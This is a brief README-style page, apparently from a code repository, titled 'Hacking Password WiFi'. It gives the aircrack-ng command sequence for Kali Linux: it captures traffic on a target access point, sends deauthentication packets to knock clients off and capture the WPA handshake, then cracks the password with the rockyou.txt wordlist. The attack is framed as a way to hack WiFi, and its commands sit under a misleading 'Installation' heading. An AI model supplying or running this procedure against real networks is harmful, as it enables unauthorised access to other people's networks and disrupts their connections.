# 🔥 HACKING PASSWORD WIFI 🔥  

**A powerful tool to hack WiFi perform network testing on Kali Linux.**  
---


✅                       ✅ 
✅                       ✅ 
✅ **Hacking Password**  ✅ 
✅                       ✅ 
✅                       ✅ 

---

## 🔧 Installation  

### **🔹 On Kali Linux**
Run the following commands:

```bash
airodump-ng wlan0mon
cd Desktops 
airodump-ng -c 10 --bssid Mac_Adress -w NAME wlan0mon
//Deauth Wifi in New Terminal 
aireplay-ng --deauth Numer_Seconds -a Mac_Adress wlan0mon
//Finished 
aircrack-ng -a2 -b Mac_Adress -w rockyou.txt NAME.cap

